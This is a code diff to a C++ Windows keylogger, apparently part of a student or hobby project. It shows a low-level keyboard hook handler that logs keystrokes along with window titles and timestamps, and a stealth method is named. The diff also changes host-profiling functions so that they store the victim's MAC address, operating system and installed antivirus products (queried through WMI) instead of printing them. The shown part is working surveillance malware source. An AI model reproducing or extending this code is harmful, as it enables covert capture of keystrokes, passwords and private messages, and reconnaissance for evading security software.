@@ -9,7 +9,6 @@
 //
 
 #include	"WindowsKeyLogger.hpp"
-#include	"dataStructure.hpp"
 #include	<iphlpapi.h>
 #include	<iomanip>
 #include 	<comdef.h>
@@ -28,18 +27,18 @@ HHOOK hookMouse;
 
 LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
 {
-  PKBDLLHOOKSTRUCT 	content;
-  char 			tmp[0xFF] = {0};
-  std::string 		str;
-  DWORD 		msg;
-  bool			shift;
-  bool			capslock;
-  short			value;
-  char			windowTitle[512];
-  HWND			windowForeground;
-  std::time_t		ts;
-  std::stringstream	ss;
-  std::string		timestamp;
+  PKBDLLHOOKSTRUCT 		content;
+  char 				tmp[0xFF] = {0};
+  std::string 			str;
+  DWORD 			msg;
+  bool				shift;
+  bool				capslock;
+  short				value;
+  char				windowTitle[512];
+  HWND				windowForeground;
+  std::time_t			ts;
+  std::stringstream		ss;
+  std::string			timestamp;
   std::unique_ptr<t_message> 	infos(new t_message);
 
   /// initialisation and retrieve the timestamp for more accurate logs
@@ -198,10 +197,12 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
 
 WindowsKeyLogger::WindowsKeyLogger()
 {
+  this->infos = new t_register();
 }
 
 WindowsKeyLogger::~WindowsKeyLogger()
 {
+  delete this->infos;
 }
 
 void WindowsKeyLogger::stealth()
@@ -237,19 +238,21 @@ void WindowsKeyLogger::getMacAddr()
   PIP_ADAPTER_INFO 	pAdapterInfo;
   DWORD  		buffer;
   DWORD			status;
+  std::stringstream	test;
 
   buffer = sizeof(AdapterInfo);
   status = GetAdaptersInfo(AdapterInfo, &buffer);
   if (status == ERROR_SUCCESS)
   {
     pAdapterInfo = AdapterInfo;
-   std::cout  << std::hex << std::uppercase << std::setfill('0') <<
+   test << std::hex << std::uppercase << std::setfill('0') <<
 	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[0]) << ":" <<
 	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[1]) << ":" <<
 	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[2]) << ":" <<
 	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[3]) << ":" <<
 	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[4]) << ":" <<
-	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[5]) << std::endl;
+	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[5]);
+    this->infos->mac = test.str();
   }
   else
   {
@@ -260,10 +263,7 @@ void WindowsKeyLogger::getMacAddr()
 void	WindowsKeyLogger::getOperatingSystem()
 {
 #ifdef _WIN32
-  std::cout << "Windows" << std::endl;
-#endif
-#ifdef _linux
-  std::cout << "Linux" << std::endl;
+  this->infos->os = "Windows";
 #endif
 }
 
@@ -275,6 +275,7 @@ void WindowsKeyLogger::getAntiVirus()
   IEnumWbemClassObject *pEnumerator = nullptr;
   IWbemClassObject *object = nullptr;
   ULONG uReturn = 0;
+  std::string	antivirusList;
 
   hres = CoInitializeEx(nullptr, 0);
   if (FAILED(hres))
@@ -330,8 +331,9 @@ void WindowsKeyLogger::getAntiVirus()
     std::string	antivirus;
     object->Get(L"displayName", 0, &cvtVersion, 0, 0);
     antivirus = CW2A(cvtVersion.bstrVal);
-    std::cout << antivirus << std::endl;
+    antivirusList.append(antivirus);
   }
+  this->infos->antivirus = antivirusList;
   services->Release();
   locator->Release();
   pEnumerator->Release();
